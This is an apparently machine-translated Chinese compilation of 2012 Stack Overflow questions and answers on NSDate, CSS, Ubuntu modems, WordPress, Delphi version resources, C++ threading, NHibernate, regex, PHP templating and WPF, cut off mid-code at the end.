为了指定您的出生日期/时间，您将给出 1981 年、7 月等。1981 年是什么意思？对你来说，这可能意味着大约 31 年前……但对于使用不同日历系统的人来说，它可能意味着完全不同的东西。从“年/月/日等”转换为“时间点”有点像从字符串转换为整数：“10”是指十还是十六？这一切都取决于您的参考框架（在这种情况下是基础 - 日期案例中的日历系统）。

日历 - 初始化为公历 - 采用这些日期组件，并能够及时为您返回一个`NSDate`“绝对”值。

至于计算两个`NSDate`值之间的差异 - 我怀疑有一个成员可以为您提供“自 Unix 纪元以来的秒数”（或可能的毫秒数）。因此，从两个日期（您的出生日期和“现在”）中取一个，然后从另一个日期中减去一个，您将得到两者之间经过的秒数（或毫秒）。

编辑：事实上，[`timeIntervalSinceNow`](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDate_Class/Reference/Reference.html#//apple_ref/occ/instm/NSDate/timeIntervalSinceNow)一旦你有了你的出生日期，这个功能可能就是你想要的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-03T04:37:24.620

你可以这样做

```
NSDateComponents *comps = [[NSDateComponents alloc] init];
[comps setYear:1981];
[comps setMonth:7];
[comps setDay:12];
[comps setHour:1];
[comps setMinute:55];
[comps setSecond:33];

NSDate *dateOfBirth = [[NSCalendar currentCalendar] dateFromComponents:comps];

NSTimeInterval timeGap=[[NSDate new] timeIntervalSinceDate:dateOfBirth ]; 
```

# user-interface - DocsList findFolder() 问题

> ID：11782317
> 
> 赞同：0
> 
> 时间：2012-08-02T16:59:40.253
> 
> 标签：user-interface, google-apps-script, google-sheets

这是一个谷歌电子表格脚本问题。

我有一个 GUI 设置，以便搜索“SouthWest”，然后找到一个“测试”表。这是我正在使用的代码。

```
var file = DocsList.getFolder("SouthWest").find("test"); 
```

当我在我的帐户下运行它时，这工作得很好（因为我有这个文件夹和文件设置正确）但是当另一个用户登录到谷歌文档时，它会尝试在新用户而不是所有者下搜索这个文件夹/文件文件。有没有办法让它只搜索当前打开的电子表格所有者的 DocsList？我在新用户下遇到的错误是“遇到错误：找不到文件夹 SouthWest。” 谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:46:51.917

如果你总是想访问同一个文件，你可以使用该`getFileById`方法并直接寻址它，而不是每次都搜索：

[https://developers.google.com/apps-script/class_docslist#getFileById](https://developers.google.com/apps-script/class_docslist#getFileById)

当然，您应该确保所有用户都被允许访问该文件。

# css - 使用固定模式的中心定位：如何也允许垂直滚动？

> ID：11782319
> 
> 赞同：3
> 
> 时间：2012-08-02T16:59:55.080
> 
> 标签：css, position

我有一个模态窗口弹出，我想相对于页面上读者的位置居中。实现这一点的最佳方法似乎是使用位置固定/前 50% 修复：

```
.fixed {
    position:fixed;
    width:100px;
    height:100px;
    top:50%;
    left:50%;
    margin-left:-50px;
    margin-top:-50px;
} 
```

到目前为止一切顺利，模态在精确的中心弹出。在此处查看 jsfiddle：http: [//jsfiddle.net/cbqN2/](http://jsfiddle.net/cbqN2/)

但如果内容对于他们的屏幕来说太长，我希望我的用户能够滚动模式：http: [//jsfiddle.net/xwhMa/1](http://jsfiddle.net/xwhMa/1)

有什么方法可以通过嵌套不同位置的 div 或 JQuery 作为最后的手段来实现这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T17:31:08.907

我不太确定这是否是您要问的，但试试这个：

```
ul li {font-size:23px}
.fixed {
    width:200px;
    height:200px;
    background:red;
    position:fixed;
    top:50%;
    left:50%;
    margin-top:-100px;
    margin-left:-100px;
    **overflow-y:scroll**
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:29:04.530

这行不通吗？

[http://jsfiddle.net/demchak_alex/cbqN2/3/](http://jsfiddle.net/demchak_alex/cbqN2/3/)

让你的模态有一个容器来保存内容并将其剪辑在一个固定的高度？然后用户可以在模态中滚动，而不用担心 jQuery 解决方案来滚动模态外部直到它到达底部，然后粘在底部等等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:29:37.753

这只是`position: fixed`:) 的一个特点，那就是......好吧，始终保持固定在屏幕上。如果您希望它出现在中心但在用户滚动页面时移动，只需使用`position: absolute;`not `fixed`。像这样：http: [//jsfiddle.net/skip405/cbqN2/2/](http://jsfiddle.net/skip405/cbqN2/2/)

# ubuntu - 连接多个 USB 3G 调制解调器的脚本

> ID：11782321
> 
> 赞同：2
> 
> 时间：2012-08-02T17:00:08.477
> 
> 标签：ubuntu, ubuntu-12.04, cellular-network, dongle, 3g-network

我正在尝试在 Ubuntu 12.04 中以编程方式连接多个 USB 3G 调制解调器（在我的情况下是两个）。我可以通过网络管理器以图形方式执行此操作，但我想在命令行上复制该过程。

这是我试图模仿的过程。

1.  连接两个 3G 加密狗，均为华为，型号：E173Bu-1（服务提供商：Airtel）和型号：E173u-1（服务提供商：MTNL）。
2.  我配置的连接不应该在网络管理器 GUI 中选中“自动连接”。
3.  现在，从网络管理器 GUI 中，我可以一个接一个地手动连接到它们。
4.  我可以在运行时看到`ppp0`并建立连接，并且路由表也适当填充。`ppp1``ifconfig`

到现在为止还挺好。

当我连接两个 3G 加密狗时，不应在网络管理器 GUI 中检查连接“自动连接”。

从命令行，我尝试了以下命令：`$ nmcli con up id "Airtel"`

它给出了以下错误：

```
$ nmcli con up id "Airtel"
Active connection state:
activating Active connection path:
/org/freedesktop/NetworkManager/ActiveConnection/2 state: unknown
Error: Connection activation failed. 
```

我又试了一次，得到了这个错误：

```
$ nmcli con up id "Airtel" 
```

> **（进程：3184）：警告**：无法初始化 NMActiveConnection /org/freedesktop/NetworkManager/ActiveConnection/3：方法“GetAll”与接口“org.freedesktop.DBus.Properties”上的签名“s”没有存在
> 
> 活动连接状态：未知活动连接路径：/org/freedesktop/NetworkManager/ActiveConnection/3
> 
> **（进程：3184）：警告**：无法为/org/freedesktop/NetworkManager/ActiveConnection/3 创建对象：方法“GetAll”在接口“org.freedesktop.DBus.Properties”上带有签名“s”不存在

如果我对连接“MTNL”尝试相同的操作，则会发生完全相同的事情。

* * *

我第一次尝试给出了体面的第一个错误。IE，

```
$ nmcli con up id "Airtel"

Active connection state: activating
Active connection path: /org/freedesktop/NetworkManager/ActiveConnection/2
state: unknown
Error: Connection activation failed. 
```

在连续的尝试中，我不断收到看起来很奇怪的错误。IE，

```
$ nmcli con up id "Airtel" 
```

> **（进程：3184）：警告**：无法初始化 NMActiveConnection /org/freedesktop/NetworkManager/ActiveConnection/3：方法“GetAll”与接口“org.freedesktop.DBus.Properties”上的签名“s”没有存在
> 
> 活动连接状态：未知活动连接路径：/org/freedesktop/NetworkManager/ActiveConnection/3
> 
> **（进程：3184）：警告**：无法为/org/freedesktop/NetworkManager/ActiveConnection/3 创建对象：方法“GetAll”在接口“org.freedesktop.DBus.Properties”上带有签名“s”不存在

I am using Ubuntu 12.04 on an Asus Eee PC seashell series notebook. (I only need a solution for this configuration only).

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T19:36:16.240

Wvdial helped me solve above problem.

Here is the wikipedia page for reference: [http://en.wikipedia.org/wiki/Wvdial](http://en.wikipedia.org/wiki/Wvdial)

# wordpress - 排除帖子自定义字段 wordpress

> ID：11782326
> 
> 赞同：0
> 
> 时间：2012-08-02T17:00:28.833
> 
> 标签：wordpress, loops, post

如何从 wordpress 循环中排除具有空自定义字段（例如“幻灯片”）的帖子？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:07:49.027

您在 Wp_query 中使用 meta_query，如下所示：

在此示例中，它们仅显示自定义字段“颜色”没有值“蓝色”的帖子

```
$args = array(
'post_type' => 'product',
'meta_query' => array(
    array(
        'key' => 'color',
        'value' => 'blue',
        'compare' => 'NOT LIKE'
    )
)
);
 $query = new WP_Query( $args ); 
```

请参阅此页面：[http](http://codex.wordpress.org/Class_Reference/WP_Query) ://codex.wordpress.org/Class_Reference/WP_Query并滚动到“自定义字段参数”部分。

# delphi - 如何在一个地方为多个应用程序定义应用程序版本？

> ID：11782328
> 
> 赞同：20
> 
> 时间：2012-08-02T17:00:32.783
> 
> 标签：delphi, msbuild, compilation, version, delphi-xe2

我们有一个由许多应用程序组成的系统。所有应用程序的版本都会同时更改。目前，当我们发布新版本时，我们必须手动打开每个应用程序的项目选项，并一一更改版本。有没有办法在同一版本上编译所有应用程序，例如，将其保存在全局文件中，并在编译时读取此文件并将该版本分配给项目？我只是想消除太多步骤，因为我们计划更频繁地更改版本号。我只想在一个地方改变它。这可以做到吗？如何？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-08-02T17:18:32.827

`VERSIONINFO`您可以在纯文本文件（例如 `Versioninfo.rc`）中创建资源

```
1 VERSIONINFO
FILEVERSION 2,0,0,0
PRODUCTVERSION 2,0,0,0
FILEOS 0x4
FILETYPE 0x1
{
BLOCK "StringFileInfo"
{
    BLOCK "040904E4"
    {
        VALUE "CompanyName", "Your Company Name Here\0"
        VALUE "FileDescription", "Your File Description Here\0"
        VALUE "FileVersion", "2.0.0.0\0"
        VALUE "InternalName", "Your Internal Name\0"
        VALUE "LegalCopyright", "© Your Copyright Notice\0"
        VALUE "LegalTrademarks", "Your Trademark Notice\0"
        VALUE "OriginalFilename", "YourExeName\0"
        VALUE "ProductName", "Your Product Name\0"
        VALUE "ProductVersion", "2.0.0.0\0"
        VALUE "Comments", "No Comments\0"
    }
}

BLOCK "VarFileInfo"
{
    VALUE "Translation", 0x0409 0x04E4
}
} 
```

`\0`注意：如图所示，每个项目的末尾都需要C 样式的空终止符 ( )，以便资源编译器正确终止字符串。否则，当您使用资源管理器显示可执行文件的版本信息时，您可能会得到乱码或部分连接的值。

在项目源文件中添加一行：

```
{$R VersionInfo.res VersionInfo.rc} 
```

我建议将通用版本信息资源放入版本控制系统中的外部引用中，然后您可以将其检出到每个项目的文件夹中并轻松更新。

执行 Project->Build，您的版本信息嵌入到 .exe 中。您可以使用 Windows 资源管理器并查看应用程序的属性进行验证。

CodeNewsFast 档案的 Embarcadero Delphi 论坛中有几篇文章（一篇由我撰写，一篇由 Jim Fleming 回复）。我的是 [here]，在这里，我将逐步描述如何在您的项目中使用预构建事件来更新我在上面发布的资源脚本中的版本号。

Jim 发布了一些回复，但大约有十几个帖子有一个可执行文件的源代码，该可执行文件可以从适用于他的预构建事件中调用。（有些事情我会做不同的事情，比如让 IDE 在命令行上传递项目名称和位置；如何做到这一点在分步文章中进行了描述。我还将处理版本解析和增量不同，但基本应用程序是一个很好的起始位置。）

Embarcadero 的小组目前已关闭，但我也能够从[CodeNewsFast](http://codenewsfast.com/cnf/article/861312760/permalink.art-ng1903q4060)检索 Jim 的代码，并且可以在此处重现它：

> 肯，
> 
> 多亏了你，我得到了它的工作。
> 
> 以防万一其他人想要实施此解决方案，您将在下面找到必要的步骤和辅助程序。
> 
> 吉姆弗莱明

A）在您的项目目录或任何地方创建您的版本信息资源文件，使用以下内容

内容和文件扩展名 .rc：

```
// Note the \000 !!!! Here and elsewhere below !!!! 
// C string terminator !!!
#define CONST_VERSION "4.1.1.1003\000" 

1 VERSIONINFO
FILEVERSION 1,0,0,1
PRODUCTVERSION 1,0,0,1
FILEOS 0x4
FILETYPE 0x1
{
BLOCK "StringFileInfo"
{

BLOCK "040904E4" // Will need changing if your language is not English and char-set not 1252 (multilingual).
{
VALUE "CompanyName", "Whatever\000"
VALUE "FileDescription", "Whatever\000"
VALUE "FileVersion", CONST_VERSION
VALUE "InternalName", "My Internal Name\000"
VALUE "LegalCopyright", "Copyright Â© whoever\000"
VALUE "LegalTrademarks", "\000"
VALUE "OriginalFileName", "If you wish\000"
VALUE "ProductName", "What pleases you\000"
VALUE "ProductVersion", CONST_VERSION
VALUE "Comments", "Anything you wish to add\000"
}
}
BLOCK "VarFileInfo"
{
VALUE "Translation", 0x0409 0x04E4
}
} 
```

B）在某个文件夹中创建一个新项目，仅模块的代码应类似于：

```
unit FormIncrementBuildNumber;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.StdCtrls, System.IOUtils, System.StrUtils;

type
  TIncrementBuildNumber = class(TForm)
    IncrementingBuildNumberLabel: TLabel;
    procedure FormShow (Sender: TObject);
    procedure FormActivate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  IncrementBuildNumber: TIncrementBuildNumber;

implementation

{$R *.dfm}

procedure TIncrementBuildNumber.FormShow (Sender: TObject);
var
  Resource_File_Contents:       TStringList;
  Full_File_Name_And_Path:      string;
  First_Line_Of_File:           string;
  Position_First_Dot:           Integer;
  Position_Second_Dot:          Integer;
  Position_Third_Dot:           Integer;
  Position_Trailing_Backslash:  Integer;
  Start_of_Build_Number:        Integer;
  Length_of_Build_Number:       Integer;
  Build_Number_In_ASCII:        string;
  Build_Number_Numeric:         Integer;
  Old_Resource_File_Name:       string;
  Success:      Boolean;
begin
  if (System.ParamCount <> 1) then
  begin
    ShowMessage ('Resource File name not in first command-line parameter.');
    Exit;
  end;

  Full_File_Name_And_Path := System.ParamStr(1);
  if (not TFile.Exists(Full_File_Name_And_Path, False)) then
  begin
    ShowMessage ('Resource file ' + Full_File_Name_And_Path + 
                 ' not found.');
    Exit;
  end;

  Resource_File_Contents := TStringList.Create;
  try
    Resource_File_Contents.LoadFromFile(Full_File_Name_And_Path);
    First_Line_Of_File := Resource_File_Contents.Strings[0];

    if (Copy(First_Line_Of_File, 1, 21) <> '#define CONST_VERSION') then
    begin
      ShowMessage ('First line of Version Info must start with "#define CONST_VERSION".' + 
                   #13 + 'Version not incremented.');
      Exit;
    end;

    Position_First_Dot := Pos('.', First_Line_Of_File);
    if (Position_First_Dot = 0) then
    begin
      ShowMessage ('Version must have format "a.b.c.d".' + #13 + 
                   'Build Number not incremented.');
      Exit;
    end;

    Position_Second_Dot := PosEx('.', First_Line_Of_File, 
                                 Position_First_Dot+1);
    if (Position_Second_Dot = 0) then
    begin
      ShowMessage ('Version must have format "a.b.c.d".' + #13 + 
                   'Build Number not incremented.');
      Exit;
    end;

    Position_Third_Dot := PosEx('.', First_Line_Of_File, 
                                Position_Second_Dot+1);

    if (Position_Third_Dot = 0) then
    begin
      ShowMessage ('Version must have format "a.b.c.d".' + #13 + 
                   'Build Number not incremented.');

      Exit;
    end;

    Position_Trailing_Backslash := PosEx('\', First_Line_Of_File, 
                                         Position_Third_Dot+1);

    if (Position_Trailing_Backslash = 0) then
    begin
      ShowMessage ('Version must have format "a.b.c.d\000".' + #13 + 
                   'Build Number not incremented.');
      Exit;
    end;

    Start_of_Build_Number  := Position_Third_Dot + 1;
    Length_of_Build_Number := Position_Trailing_Backslash - 
                              Start_of_Build_Number;

    if (Length_of_Build_Number < 1) then
    begin
      ShowMessage ('Build Number must be present.' + #13 + 
                   'Build Number not incremented.');
      Exit;
    end;

    Build_Number_In_ASCII := Copy (First_Line_Of_File, 
                                   Start_of_Build_Number, 
                                   Length_of_Build_Number);
    Success := TryStrToInt (Build_Number_In_ASCII, Build_Number_Numeric);
    if (not Success) then
    begin
      ShowMessage ('Build Number must be numeric integer.' + #13 + 
                   'Build Number not incremented.');
      Exit;
    end;

    Build_Number_Numeric := Build_Number_Numeric + 1;
    Build_Number_In_ASCII := IntToStr(Build_Number_Numeric);
    Resource_File_Contents.Strings[0] := Copy(First_Line_Of_File, 1, 
                                              Position_Third_Dot) +
                                              Build_Number_In_ASCII + 
                                              '\000"';
    Old_Resource_File_Name := Full_File_Name_And_Path;
    Old_Resource_File_Name := TPath.ChangeExtension(Old_Resource_File_Name, '~rc');

    if TFile.Exists(Old_Resource_File_Name, False) then
      TFile.Delete(Old_Resource_File_Name);

    Success := RenameFile(Full_File_Name_And_Path, Old_Resource_File_Name);
    if (not Success) then
    begin
      ShowMessage ('Error renaming old resource file to have extension "~rc".' + #13 + 
                  'Build Number not incremented.');
      Exit;
    end;

    Resource_File_Contents.SaveToFile(Full_File_Name_And_Path);
  finally
    Resource_File_Contents.Free;
  end;
end;

procedure TIncrementBuildNumber.FormActivate (Sender: TObject);
begin
  Close;
end;

end. 
```

C) 在应增加内部版本号的项目的项目选项中：

*   去掉勾选“包括版本信息”。

*   添加具有以下文本的预构建事件，如所写，包括两对双引号，替换 < > 中的部分：

"<自增程序exe的完整文件名和路径>" "<.rc资源文件的完整文件名和路径>"

D) 添加到项目源代码中，就在“program”关键字的正下方：

```
{$R '<whatever you called it>.res' '<whatever you called it>.rc'} // I think both names must 
```

在这里是一样的：IIRC，当它们不同时会出错。

E) 编译、运行并享受 Auto-Increment 版本号的返回，尽管 Embarcadero 已经移除了该设施。

> 吉姆的内容结束

例如，您可以使用预构建事件来更新`ProductName`or`FileDescription`值，或任何其他必须与基本脚本不同的值。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-08-02T18:30:47.470

**更新**：它不是 RADStudio 本身的一部分，而是来自**[Andreas Hausladen 的 DDevExtensions](http://andy.jgknet.de/blog/ide-tools/ddevextensions/)**（我已经习惯了......！）。

如果您安装了来自 Andreas Hausladen的优秀**[DDevExtensions](http://andy.jgknet.de/blog/ide-tools/ddevextensions/)** ，您可以**在 IDE中使用 ProjectGroup 来完成。**

*   有一个项目组来包含您的所有项目
*   确保您的每个项目都在`Options|Version Info page`.
*   使用菜单`Project|Set Versioninfo...`打开 Set Project Versioninfo 对话框（仅一次，当前项目无关紧要）。
*   在那里，您可以指定所有版本信息并选择“应用于所有”或仅应用于选定项目（如果您选中“应用于选定项目”）。

例如，看看我如何同时为两个项目设置版本： ![我同时为两个项目设置版本的示例](../Images/4ddb865eeb7bd0fbeea3113a49b8b617.png)

然后`Build All`，ProjectGroup 上的 a 生成了两个 exe，版本设置为 1.1.1.9 和所有其他细节......

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-03T12:48:35.363

这是 dzPrepBuild 的用例之一： [http ://www.dummzeuch.de/delphi/dzprepbuild/englisch.html](http://www.dummzeuch.de/delphi/dzprepbuild/englisch.html)

（注：该项目已移至 sourceforge，因为 berlios 将在去年关闭。http: [//sourceforge.net/projects/dzprepbuild/](http://sourceforge.net/projects/dzprepbuild/)）

# c++ - 同步线程对（静态）对象的创建和销毁

> ID：11782330
> 
> 赞同：0
> 
> 时间：2012-08-02T17:00:36.353
> 
> 标签：c++, multithreading, static

[糟糕的标题，我知道，但是（现在）我想不出更好的东西]

* * *

假设我有几个对象，类的实例是这样的：

```
class MyWorker: public Thread
{
public:
    void Reconnect(...);
    //...
private:
    void DoDisconnect();
    ConnectionPtr m_ptrConnection;
}; 
```

这些对象中的每一个都是单独的线程。`ConnectionPtr`是一个引用计数智能指针。

`Reconnect`首先执行`DoDisconnect`，它只是取消`m_ptrConnection`（以减少引用计数器），然后执行`ConnectionFactory::Create`：

```
class ConnectionFactory
{
private:
    ConnectionFactory();

public:
    ConnectionPtr Create( ... );

private:
    //...
    void Destroy();
    static m_mutex;
    static ConnectionPtr m_ptrConnection;
}; 
```

在这里，`Create( ... )`调用`Destroy()`并在此之后重新初始化`m_ptrConnection`成员并将其作为结果返回。

这个想法是，所有实例都`MyWorker`将使用相同`Connection`的（这实际上是什么并不重要）。

问题如下：所有实例`MyWorker`必须首先调用它们`DoDisconnect`（以减少引用计数器）然后执行`Create`（当`Create`正在执行时`Destroy`，引用计数器`Connection`必须为 1（只是静态指针应该是非 NULL））。

想法我怎样才能做到这一点？

[我知道，这听起来像是一个糟糕的设计并且“过于本地化”。我不能改变首先调用的设计`MyWorker`和事实。如果有人有更好的主意，我可以稍微改变一下。`Reconnect``DoDisconnect``ConnectioFactory`]

* * *

[目前，我锁定静态`mutex`以同步对`m_ptrConnection`. 如果已经被其他线程重新初始化，`Create`则只会返回。 唯一的问题是，如何确保所有线程都已首先执行？以某种方式使用第二个？还是一些静态线程安全（原子）计数器？`m_ptrConnection`
`MyWorker``DoDisconnect``mutex`]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T09:01:17.407

[来自问题的评论]

您可以在 和之间插入*线程屏障*`DoDisConnect`，`Destroy`以确保所有线程都在`DoDisconnect`之前完成`Destroy`。要了解一些想法，您可以查看[boost 实现](http://www.boost.org/doc/libs/1_50_0/boost/thread/barrier.hpp)，它使用`mutex`和`condition_variable`。

# .net - .net 3.5 数据绑定和休眠 3.3

> ID：11782333
> 
> 赞同：1
> 
> 时间：2012-08-02T17:00:51.257
> 
> 标签：.net, nhibernate

这可能是一个奇怪的问题，但也许有人有一个想法......

我刚刚完成并将 NHibernate 1.2 升级到 3.3。升级进行得相当顺利，一切似乎都正常工作，除非我尝试将 IList 对象数据绑定到 DropDown 或 GridView。基本上发生的情况是，如果列表很大，.DataBind 调用需要很长时间，通常会导致应用程序超时。

我确信这个问题与绑定大型列表有关，但奇怪的是在 nhibernate 升级之前问题没有发生。例如，以下代码在升级期间未更改：

```
MarketSourceLogic sourceLogic = new MarketSourceLogic();
ddl = ((DropDownList)Accordion1.FindControl("dEditSourceAbbr"));
ddl.DataSource = sourceLogic.LoadAllMarketSources();
ddl.DataTextField = "Abbr";
ddl.DataValueField = "MarketSourceId";
ddl.DataBind();
ddl.Items.Insert(0, new ListItem(Constants.DROPDOWN_SELECT_TEXT, "0")); 
```

在 NHib 1.2 中，代码需要几秒钟才能执行（尤其是 LoadAllMarketSources 调用），但不会出现问题。升级到 3.3 后，LoadAllMarketSources 调用花费了大约相同的时间，但是一旦调用 ddl.DataBind()，页面就会挂起并最终超时。

我知道这不是通过获取整个对象列表来加载下拉列表的最佳方式，我应该只获取我需要的字段。这不是重点，这只是一个例子。加载需要整个对象的gridview时也会出现问题。真正的问题是这些网格中的许多都加载了搜索结果，并且用户可以选择不搜索任何内容，因此页面将超时。

基本上我想知道是否有办法解决这个超时问题（也许我错过了 NHibernate 设置？）或者整个项目是否需要重构。

任何帮助和见解表示赞赏。

请注意，我确实尝试使用 .net 4 并获得了相同的结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T16:21:40.147

问题是`.DataBind()`正在调用`GetHashCode()`强制子对象加载。只需要修改`GetHashCode()`以避免加载子对象。非常感谢 Miroslav 的有益评论。

# regex - 为几种情况设置正则表达式

> ID：11782336
> 
> 赞同：-1
> 
> 时间：2012-08-02T17:01:00.260
> 
> 标签：regex

我在数组中有一组单词，我只想获取与我应用的正则表达式匹配的单词。

假设我有以下一组单词：

朋友开除炒下午会员激活员工 neafe

我需要应用一个完成以下规则的正则表达式：

1.- 一个只获取以“f”开头的单词的正则表达式。2.- 一个只获取以“f”结尾的单词的正则表达式。3.- 一个只获取包含“f”的单词的正则表达式。4.- 一个正则表达式，只获取在“f”之前有一个字母的单词。5.- 一个正则表达式，它只获取在“f”之后有一个字母的单词。

因此，每种情况的结果都是：

案例 1 朋友炒了炒

案例2工作人员

案例 3 朋友解雇了油炸下午的附属员工 neafe

案例 4 下午附属公司

案例 5 工作人员 neaf

请需要帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:04:56.323

只有当单词符合您为每种情况描述的标准时，它们才会全部匹配：

1.  `^f.*`
2.  `.*f$`
3.  `f`
4.  `^.f`
5.  `f.$`

当然每个模式的输入必须是一个单词

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:18:00.997

1.  `^f.*`
2.  `.*f$`
3.  `f`
4.  `.f.*`
5.  `.*f.`

尝试这个...

# css - CSS：以 ems 计算：字体大小内的字体大小？

> ID：11782337
> 
> 赞同：1
> 
> 时间：2012-08-02T17:01:01.377
> 
> 标签：css, font-size

我目前的项目完全基于ems。

**html**

```
<div class="tiny">
    This is some tiny text which is tiny.
</div>

<div class="small">
    This is some small text which is small.
    <div class="tiny">
        And this is some tiny text inside small text which should be as tiny as the other tiny one.
    </div>
</div> 
```

**css**

```
.tiny {
    font-size:0.7em;
    line-height:1.7;   
}

.small {
    font-size:0.8em;
    line-height:1.3em;  
} 
```

在这种情况下，`tiny`文本内的`small`文本小于普通`tiny`文本。

首先，这是为什么呢？其次，我该如何解决这个问题或使其大小相同？

[http://jsfiddle.net/DFKtF/](http://jsfiddle.net/DFKtF/)

先感谢您！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:20:44.287

该`em`单位主要表示元素本身的字体大小，但在值`font-size`（没有意义的地方）中，它表示父元素的字体大小。因此，在您的示例中，数量`0.7em`是封闭元素字体大小的 0.7 倍，该元素的字体大小已经减小。

要解决这个问题，只需相应地选择数字。如果你想要的小文本是复制文本字体大小的 0.7 倍，并且封闭元素的字体大小是复制文本大小的 0.8 倍，那么你需要数字 0.7/0.8，即`.small`应该有`font-size:0.875em`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:05:56.560

不使用`em`，使用`px`。或仔细计算。当用于指定字体大小时，`em`单位是指父元素的字体大小。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:05:56.900

`.em`是相对测量，不是绝对的。

# php - 我仍在努力证明模板系统的合理性。为什么我不应该只发出 html？

> ID：11782341
> 
> 赞同：0
> 
> 时间：2012-08-02T17:01:19.867
> 
> 标签：php, template-engine

我真的看不出这些之间的区别。模板如何更好？我不只是不理解它，或者我如何说服别人使用它。我理解关注点的“分离”，但我没有遇到大问题。第一个示例不是`<li>`像一个`echo`那样生​​成多个标签吗？而且，我会使用 php 作为“模板语言”，所以我不关心 Smarty 或其他一些系统。谢谢。

[为什么我应该在 PHP 中使用模板系统？](https://stackoverflow.com/questions/436014/why-should-i-use-templating-system-in-php)

```
<h1><?=$title?></h1>
<ul>
  <?php foreach ($items as $item) {?>
  <li><?=$item?></li>
  <?php } ?>
</ul> 
```

和（我在论坛中找到的一些片段作为示例）：

```
echo "<table>";

for ($i = 0; $i < $largestArray; $i++)
{
        echo "<tr>";

        if ($i < $array1Size)
        {
                echo "<td>";
                echo $array1[$i];
                echo "</td>";           
        }
        else
        {
                echo "<td>";
                echo "null";
                echo "</td>";           
        }

        if ($i < $array2Size)
        {
                echo "<td>";
                echo $array2[$i];
                echo "</td>";           
        }
        else
        {
                echo "<td>";
                echo "null";
                echo "</td>";           
        }

        echo "</tr>";
}

echo "</table>"; 
```

或类似的东西：

```
<table id="working" border="0" cellspacing="1" cellpadding="3">
    <tr>
        <?php foreach ($csv->titles as $value): ?>
            <td><?php echo $value; ?></td>
        <?php endforeach; ?>
    </tr>

    <?php foreach ($csv->data as $key => $row): ?>
        <tr>
            <?php foreach ($row as $value): ?>
                <td><?php echo $value; ?></td>
            <?php endforeach; ?>
        </tr>
    <?php endforeach; ?>
</table> 
```

编辑：这应该是一个社区维基问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:06:42.470

您的标识似乎有点混乱，但重点是第二个版本的可读性更高（例如，您可以轻松阅读标签层次结构）。可读代码是可以轻松维护或重构的代码。

仅使用 PHP 的 echo 关键字编写下面的代码不会很可读。您还会担心引号和双引号。使用类似模板的方法，您最终会得到一个看起来类似于 HTML 文档的代码。

```
<table id="working" border="0" cellspacing="1" cellpadding="3">
    <tr>
        <?php foreach ($csv->titles as $value): ?>
            <td><?php echo $value; ?></td>
        <?php endforeach; ?>
    </tr>
    <?php foreach ($csv->data as $key => $row): ?>
        <tr>
            <?php foreach ($row as $value): ?>
                <td><?php echo $value; ?></td>
            <?php endforeach; ?>
        </tr>
    <?php endforeach; ?>
</table> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:04:54.737

模板系统如 cakephp 和 codeignitor 使用 MVC，它使代码更清晰，更符合标准。您也可以编写自己的 MVC。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:34:03.210

模板系统*不是*表示逻辑分离的万能解决方案。它们是**一种**解决方案，并且被许多 PHP 框架使用。在一般“MVC”/MVA/MVP/MVVM PHP 开发中，您不希望在表示层中有任何业务逻辑。回显 HTML 是（通常）直接违反这种做法；使用模板，表示层中不存在业务逻辑，反之亦然。

回到第一点，模板是**一种**解决方案，而不是**解决**方案。表示层有很多可用的选项，很大程度上取决于您的编码风格和/或框架/库的使用。

在个人层面上，我更喜欢模板（对于大多数小型医疗项目），除了上面概述的一些原因：

1.  使“主题化”和交换网站样式更容易。只需修改模板或实现可以加载不同模板的主题切换器

2.  从模型到模板是一件轻而易举的事，因为模板（通常）只是带有一些 php 片段回显数据的 HTML。

3.  模板是“愚蠢的”。他们不需要知道业务逻辑发生的任何事情，他们所关心的只是将一些数据回显到 HTML 中。

4.  可读性。这几乎完全是个人喜好，尤其是考虑到广泛的模板语法。

tl;dr - 模板与 [在此处插入其他解决方案] 几乎完全是主观的，除非您有基于托管、客户要求、流量水平等的限制。如果是这种情况，那么找到基准以及更多关于效率和可扩展性的信息，并制作根据项目要求做出明智的决定。

# wpf - 从 SurfaceInkCanvas 将笔画绘制到图像上

> ID：11782343
> 
> 赞同：0
> 
> 时间：2012-08-02T17:01:21.597
> 
> 标签：wpf, pixelsense

我正在尝试创建一个允许用户在图像上绘图的应用程序。我从 PhotoPaint SDK 示例开始。我了解 SurfaceInkCanvas 设置为透明并位于图像顶部。当用户完成绘图时，我想将笔画绘制到图像本身上。这就是我卡住的地方。谁能指出我正确的方向？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:52:07.527

从以下网址下载 WriteableBitmap 扩展库： [http ://writeablebitmapex.codeplex.com/](http://writeablebitmapex.codeplex.com/)

用法：

```
using System;
using System.IO;
using System.Net;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace TestApp
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void SaveImage(object sender, RoutedEventArgs e)
        {
